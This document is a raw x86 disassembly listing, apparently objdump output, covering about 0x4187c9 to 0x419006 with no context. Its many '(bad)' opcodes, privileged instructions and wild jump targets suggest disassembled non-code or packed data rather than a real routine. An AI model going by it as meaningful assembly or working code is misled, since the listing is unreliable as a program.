  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
  418fee:	jns    0x418f7b
  418ff0:	vmread DWORD PTR [ecx+0x45],ebx
  418ff4:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  418ffa:	adc    al,0x8b
  418ffc:	jge    0x419012
  418ffe:	mov    edi,DWORD PTR [eax-0x4]
  419001:	add    edi,DWORD PTR [edi]
  419003:	or     bh,bh
  419005:	push   ebp
  419006:	push   es
